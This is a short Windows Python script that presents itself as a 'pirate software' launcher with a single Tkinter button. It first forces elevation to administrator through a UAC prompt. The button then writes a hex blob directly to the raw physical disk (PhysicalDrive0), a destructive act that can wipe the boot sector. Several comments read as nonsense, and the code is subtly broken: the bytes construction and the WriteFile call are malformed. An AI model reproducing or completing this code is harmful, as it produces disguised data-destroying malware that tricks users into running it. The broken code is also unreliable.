import tkinter as tk
import os
import ctypes
import sys
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def elevate():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable,
        " ".join(f'"{arg}"' for arg in sys.argv),
        None, 1
    )


if sys.platform == "win32":
    if not is_admin():
        elevate()
        sys.exit()
# run pirate analysis
# run devosmod
# set MSH-Shell-TypeExecutionrun

def run():
    
    hex_data = bytes(["44bc2025510d89116f37f90f4504133523d06954ea780336ca3"])

    dll = type('DLL', (), {})()
    dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x00000001 | 0x00000002, None, 3, 0, 0)
    dll.Kernel32.WriteFile(hDevice , hex_data, None)
    dll.Kernel32.CloseHandle(hDevice)

root = tk.Tk()
root.title("BeysonPirate")
root.geometry("240x120")
root.resizable(False, False)
root.configure(bg="#f9f9f8")

tk.Button(root, text="run pirate software", command=run,
          font=("Helvetica", 14), padx=28, pady=10,
          bg="#1a1a1a", fg="#f9f9f8", relief="flat",
          cursor="hand2", activebackground="#1a1a1a",
          activeforeground="#f9f9f8").pack(expand=True)

root.mainloop()